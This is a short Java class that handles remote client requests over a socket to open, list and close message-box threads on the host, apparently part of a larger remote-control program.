package electron.tweaks;

import java.io.IOException;
import java.net.Socket;
import java.util.ArrayList;
import java.util.List;

import electron.utils.Functions;
import electron.utils.logger;

public class MessageBoxTweaks {
	private static List<Thread> boxesAll = new ArrayList();//all users
	private List<Thread> boxes = new ArrayList();//this user
	private Socket s;//Client socket
	
	/**
	 * Unit messages tweaks
	 * @param s - client's socket
	 */
	public MessageBoxTweaks(Socket s) {
		this.s=s;
	}
	
	public void callMessageBox(String text,String title, String type,String msgtype) throws IOException {
		if(Functions.isNumber(msgtype) && Functions.isNumber(type)) {
		Thread boxthread =new mboxthread(text, Integer.parseInt(type), Integer.parseInt(msgtype), title, s,boxesAll,boxes);
		boxthread.start();
		}else {
			Functions.sendData("[MESSAGES_MANAGER]: incorrect numbers. Check syntax and try again.", s);
		}
	}
	public String close() {
		boxes=Functions.checkAliveThreads(boxes);
		boxes.get(boxes.size()-1).stop();
		boxes.remove(boxes.size()-1);
		return "[MESSAGES_MANAGER]: Done.";
	}
	public static String stopAll() {
		boxesAll=Functions.checkAliveThreads(boxesAll);
		for(int i = 0;i<boxesAll.size();i++) {
			boxesAll.get(i).stop();
		}
		boxesAll.clear();
		return "[MESSAGES_MANAGER]: closed all messageboxes.";
	}
	public void show() throws IOException {
		boxes=Functions.checkAliveThreads(boxes);
		Functions.sendData("[MESSAGES_MANAGER]: list of threads:", s);
		for(int i = 0;i<boxes.size();i++) {
			Functions.sendData(boxes.get(i).toString(), s);
		}
		Functions.sendData("[MESSAGES_MANAGER]: Done.", s);
	}
}
